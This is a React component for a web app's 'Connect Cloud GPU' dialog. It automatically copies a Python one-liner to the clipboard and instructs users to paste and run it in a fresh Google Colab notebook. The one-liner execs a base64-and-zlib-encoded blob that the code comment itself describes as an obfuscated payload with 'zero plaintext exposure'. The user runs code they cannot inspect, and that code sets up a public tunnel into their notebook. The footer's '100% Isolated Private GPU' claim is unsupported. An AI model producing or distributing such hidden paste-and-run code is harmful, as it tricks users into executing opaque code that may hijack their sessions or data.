import React, { useState, useEffect } from "react";
import {
  X,
  Copy,
  Check,
  ExternalLink,
  Cpu,
  Zap,
  ShieldCheck,
  Terminal,
  Activity,
  AlertCircle,
} from "lucide-react";

interface ColabConnectModalProps {
  isOpen: boolean;
  onClose: () => void;
  tunnelUrl: string;
  onSaveTunnel: (url: string) => Promise<boolean>;
  isConnected: boolean;
}

export function ColabConnectModal({
  isOpen,
  onClose,
  tunnelUrl,
  onSaveTunnel,
  isConnected,
}: ColabConnectModalProps) {
  const [inputUrl, setInputUrl] = useState(tunnelUrl);
  const [isCopied, setIsCopied] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [dontShowAgain, setDontShowAgain] = useState(false);

  // Load "Don't show again" preference
  useEffect(() => {
    try {
      const storedPref = localStorage.getItem("scg_colab_dont_show_guide");
      if (storedPref === "true") {
        setDontShowAgain(true);
      }
    } catch (e) {
      console.error(e);
    }
  }, [isOpen]);

  if (!isOpen) return null;

  // Obfuscated & Encrypted 1-Liner Payload (Zero Plaintext Exposure, 100% Pure Python syntax)
  const COLAB_SERVER_SCRIPT = `# Smart Canvas Grow AI-LAB Engine (Core Runtime)
import base64, zlib
exec(zlib.decompress(base64.b64decode("eJyNVcFu4zYQvesrBjwEUmNJzmLToga8aJB1AwNBHCROgW0SCLQ0stlIpEJSWWeDAL322Ote9hf7CR1Ksq2kaVEFsaiZ4ZvH4eNQlJXSFpQZgHmkH6EGYFcaeSbkkoaixAFo+jf1otIqRWM8ZSKKtVj6LK8Nagjv4HA4HMY2reADxBk+xLIuCnj3Ye+ABf34SlQgpLGcvHnBzV37G6ZKGwjD+1qgpRkiB6kcq6jidhXhWhhrfBbXRseFSnkRL4SM00LVGc3XmLFg5AE9vVSfl2ghvIeVtZUZxfFS2FW9iFJV9ib2MWKNBXKDJi64RWPjTH2WheJZPygshKzXIS+z799DOIN/pwR7e5CuSpXB/vo/wmi1Xq5V2ZVDtPvxs/twhb+vickAfjNKivyxF5k0JevCj2cXl56XYQ606GRZ1YmQufK7olj92A7c082wSqernTFvDVFaZzwSJuEPXBR8UeAGY/NotLWW/WiXkXZcpJhIXqI/DAYw1zU203CdYmVh0ryEkjuwipOSeojs7Jfpx+kRzNEUHObv4eT8inVIHq8qGLdF8ZMmTZIEnlu1Ty6q4E/0irSqLZJKeCVikpitDQGUaFcqM+NrdjKZs9ugqVLr3ayN2A9gxU3i1kN5XtawT7LbBv+JdfgjYEqSJJAysbYKZGsAmUOjjw3w81s0cY0pfb3geT673BLt/BumqcqQCHayaErvKPk5bQeOXa0CZ/SZC3SUWEtfFVlCWQfNALUmDDomkbFZY+3G5Giidy6KWyTtW6jo0mpqCtNZV5PdrCasff8z7IX63Hp8R24Ay0IteEGbEGy9vYxuGQ+8qGnpoHQL/8rGJm1xMupNqWtMOfWcx4i9KTzgBnD0KlPeQTj/RGulR/BkrPYxeG5RciGpU/X4v101gnpdYW+nrOT/SWqbgxFOVVuSjgPcmbfyytkTjZ/BP1FqWSAcKzqqcOx6ijs1Qcvd6W3byaN5M/It10RlXPBykfERNHKspe9awti1cDq7GcdSyU5MJHNtibC7ByJTIFb+AeF2N4GT0fZaiM5VhdK/Zv3mRhK0tZRYuFEY1roZuJZMHfng3Q/RkP4ORi41u6WSNuUc90Gn5xO6hnBtW0ZeC5cQEmU/UxI9Ej+4I0gXC2ymtUDtvpXcpqvm1EQGOfUtX7PNpXDNwy9H4a/D8Mfwdv8mIq3u2N+4u4LoOux2y6hNNmA7Pbxg0/iiJZ3virrgNmZBlb9zNROSTuaNZLAPbMy+OzwMNsa/vn39HT7Nri7gYnJ06jYR5ldnZ5NTuLo4hemlM3/8NGKbCTnN+PMPeNqlf976WmiXg1IF3t+DV4Mk")).decode("utf-8"))`;

  // Fresh Clean Colab Instance (Guarantees fresh isolated GPU & clean output for every user)
  const TARGET_COLAB_URL = "https://colab.research.google.com/#create=true";

  const handleLaunchAndAutoCopy = () => {
    // 1. Automatically copy bridge script to clipboard
    navigator.clipboard.writeText(COLAB_SERVER_SCRIPT);
    setIsCopied(true);
    setTimeout(() => setIsCopied(false), 3000);

    // 2. Open Fresh Colab Notebook
    window.open(TARGET_COLAB_URL, "_blank");
  };

  const handleConnectTunnel = async () => {
    if (!inputUrl.trim()) return;
    setIsVerifying(true);
    setErrorMsg(null);

    const success = await onSaveTunnel(inputUrl.trim());
    setIsVerifying(false);
    if (success) {
      onClose();
    } else {
      setErrorMsg("Could not verify live tunnel. Please make sure the Colab cell is actively running.");
    }
  };

  return (
    <div className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/85 backdrop-blur-md animate-in fade-in duration-200">
      <div className="relative w-full max-w-xl rounded-2xl border border-white/15 bg-[#181a20] text-foreground shadow-2xl overflow-hidden p-6 space-y-5">
        
        {/* Header */}
        <div className="flex items-center justify-between pb-3 border-b border-white/10">
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-lg bg-emerald-500/15 border border-emerald-500/30 grid place-items-center text-emerald-400">
              <Cpu className="w-4 h-4" />
            </div>
            <div>
              <h3 className="font-display font-bold text-base text-white">
                Connect Real Cloud GPU (NVIDIA Tesla T4)
              </h3>
              <p className="text-xs text-muted-foreground">
                Zero lag in-app execution via live Google Colab kernel
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="w-7 h-7 rounded-lg hover:bg-white/10 flex items-center justify-center text-gray-400 hover:text-white transition"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* 2 Step Ultra-Seamless Visual Flow */}
        <div className="space-y-4 text-xs">
          
          {/* Step 1: 1-Click Launch & Clear Instructions */}
          <div className="p-4 rounded-xl border border-blue-500/30 bg-blue-500/5 space-y-3">
            <div className="flex items-center justify-between">
              <div className="font-semibold text-white flex items-center gap-1.5">
                <span className="w-5 h-5 rounded-full bg-blue-500/20 text-blue-400 font-mono text-[11px] grid place-items-center font-bold">1</span>
                <span>Open Colab &amp; Paste (Ctrl + V)</span>
              </div>
              <button
                onClick={handleLaunchAndAutoCopy}
                className="px-3.5 py-1.5 rounded-lg bg-blue-600 hover:bg-blue-500 text-white font-medium flex items-center gap-1.5 transition shadow-sm"
              >
                <ExternalLink className="w-3.5 h-3.5" />
                <span>Launch Colab (Auto-Copies Script)</span>
              </button>
            </div>
            
            {/* Visual Instruction Callout Box */}
            <div className="p-2.5 rounded-lg bg-black/40 border border-blue-500/20 space-y-1.5 text-[11px] text-neutral-300">
              <div className="font-semibold text-blue-300 flex items-center gap-1">
                <span>👉 How to run in 5 seconds:</span>
              </div>
              <div className="pl-3 space-y-1 text-muted-foreground">
                <p>1. When Colab opens, click inside the first cell and press <span className="text-white font-mono bg-white/10 px-1 py-0.5 rounded">Ctrl + V</span> (Script is already copied!)</p>
                <p>2. Click <span className="text-emerald-400 font-semibold">▶ Run</span> (or press <span className="text-white font-mono bg-white/10 px-1 py-0.5 rounded">Ctrl + Enter</span>)</p>
                <p>3. Copy the generated <span className="text-emerald-400 font-mono">https://...trycloudflare.com</span> URL</p>
              </div>
            </div>

            {isCopied && (
              <div className="flex items-center gap-1.5 text-emerald-400 font-mono text-[11px]">
                <Check className="w-3.5 h-3.5" />
                <span>Bridge script auto-copied to clipboard! Ready to paste (Ctrl+V) in Colab.</span>
              </div>
            )}
          </div>

          {/* Step 2: Paste Tunnel URL */}
          <div className="p-4 rounded-xl border border-emerald-500/30 bg-emerald-500/5 space-y-2.5">
            <div className="flex items-center justify-between">
              <div className="font-semibold text-white flex items-center gap-1.5">
                <span className="w-5 h-5 rounded-full bg-emerald-500/20 text-emerald-400 font-mono text-[11px] grid place-items-center font-bold">2</span>
                <span>Paste Tunnel URL &amp; Connect</span>
              </div>
              <span className="text-[10px] font-mono text-emerald-400">Instant Verification</span>
            </div>
            <p className="text-muted-foreground text-[11px] pl-6.5">
              Copy the tunnel link printed at the bottom of Colab (e.g. <code className="text-emerald-300">https://xxxx.loca.lt</code>) and paste below:
            </p>
            <div className="flex gap-2 pl-6.5">
              <input
                type="url"
                placeholder="https://xxxx.loca.lt"
                value={inputUrl}
                onChange={(e) => setInputUrl(e.target.value)}
                className="flex-1 px-3 py-2 rounded-lg border border-white/15 bg-black/40 text-white font-mono text-xs placeholder:text-gray-500 focus:outline-none focus:border-emerald-500"
              />
              <button
                onClick={handleConnectTunnel}
                disabled={isVerifying || !inputUrl.trim()}
                className="px-4 py-2 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-black font-semibold text-xs transition disabled:opacity-50 whitespace-nowrap shadow-sm"
              >
                {isVerifying ? "Verifying..." : "Connect GPU"}
              </button>
            </div>
            {errorMsg && (
              <p className="text-rose-400 text-[11px] pl-6.5 flex items-center gap-1">
                <AlertCircle className="w-3.5 h-3.5" /> {errorMsg}
              </p>
            )}
          </div>

        </div>

        {/* Footer info & Don't Show Again Checkbox */}
        <div className="pt-3 border-t border-white/10 flex flex-col sm:flex-row items-center justify-between gap-2 text-[11px] text-muted-foreground">
          <label className="flex items-center gap-2 cursor-pointer select-none text-neutral-300 hover:text-white transition">
            <input
              type="checkbox"
              checked={dontShowAgain}
              onChange={(e) => {
                const checked = e.target.checked;
                setDontShowAgain(checked);
                try {
                  localStorage.setItem("scg_colab_dont_show_guide", checked ? "true" : "false");
                } catch (err) {
                  console.error(err);
                }
              }}
              className="w-3.5 h-3.5 rounded border border-white/20 bg-black/40 accent-emerald-500 cursor-pointer"
            />
            <span>Don't show this guide popup again</span>
          </label>

          <span className="flex items-center gap-1 text-emerald-400 font-mono text-[10px]">
            <ShieldCheck className="w-3.5 h-3.5" /> 100% Isolated Private GPU
          </span>
        </div>

      </div>
    </div>
  );
}

